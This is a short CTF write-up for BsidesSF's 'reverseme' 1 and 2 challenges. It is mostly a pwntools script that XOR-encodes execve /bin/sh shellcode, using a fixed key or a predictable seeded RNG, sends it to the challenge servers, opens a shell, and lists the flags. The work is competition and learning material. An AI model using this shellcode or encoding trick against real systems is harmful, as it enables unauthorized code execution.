## BsidesSF CTF: reverseme (1,2)
##### *tl;dr: encoded shellcode payloads*

#### This series of challenges revolved around the concept of encoded shellcode. For the easier first challenge, our shellcode only needs to be xor'ed with 0x41 and the server will be the one to decrypt it. 

#### For the second challenge, we also had the hurdle of the RNG to deal with. But since we know the value of the seed, it is easy to predict the next outputs of the RNG by preparing a seeded one ourselves and generate the needed bytes to encode the shellcode with. 

```python
from pwn import *

#: CONNECT TO CHALLENGE SERVERS
#p = process('./reverseme2')
#p = remote("reverseme-53b7d3aa.challenges.bsidessf.net", 1339)
p = remote("reverseme2-24b392b5.challenges.bsidessf.net", 1339)

#: GDB SETTINGS
breakpoints = ['break *main + 283']
#gdb.attach(p, gdbscript = '\n'.join(breakpoints))

#: EXPLOIT INTERACTION STUFF
context.arch = 'amd64'

#: for reverseme1
shellcode = "\x48\x31\xD2\x48\x31\xFF\x48\x31\xF6\x48\x31\xC0\x50\x48\xBB\x2F\x62\x69\x6E\x2F\x2F\x73\x68\x53\x48\x8D\x3C\x24\xB0\x3B\x0F\x05"
'''encoded_shellcode = ""
for sc in shellcode:
	encoded_shellcode += chr(ord(sc) ^ 0x41)'''

#: for reverseme2
from ctypes import *
libc = cdll.LoadLibrary('/lib/x86_64-linux-gnu/libc.so.6')
libc.srand(0x13371337)

encoded_shellcode = ""
for sc in shellcode:
	rng = int(libc.rand())
	encoded_shellcode += chr(ord(sc) ^ ((rng >> 3) & 0xff))

#: PWN THY VULNS
p.sendline(encoded_shellcode)
p.interactive()

#: CTF{me_reverse}
#: CTF{again_me_reverse}
```